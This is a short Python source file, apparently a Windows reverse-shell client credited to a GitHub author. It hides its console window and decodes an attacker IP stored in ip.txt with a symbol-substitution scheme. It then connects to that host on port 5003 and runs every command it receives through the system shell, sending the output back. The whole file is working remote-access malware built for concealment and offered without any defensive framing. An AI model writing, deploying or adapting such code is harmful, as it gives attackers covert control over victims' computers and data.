#created by Ph3nX-Z : https://github.com/Ph3nX-Z
import socket
import subprocess
ip_re=""
port = 5003
buffer = 1024
def hiden(): # Hide console
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

hiden()

def read(): #read ip.txt (first line)
     read=open("ip.txt", "r") # put attacker ip in ip.txt
     data=read.read()
     read.close()
     return data
temp=read()
host=temp

############## Decrypting ip
for numero in temp:
    cryptlist=["$","#","*","-","@","%","?","!","+"]
    if numero != "." :
        numero=cryptlist.index(numero)
        ip_re+=str(numero+1)
    else:
        ip_re+=numero
host=ip_re # ip decrypted from ip.txt (crypted ip)

s = socket.socket()
s.connect((host, port)) # connect to the server

while True:

    command = s.recv(buffer).decode() #commands from server
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
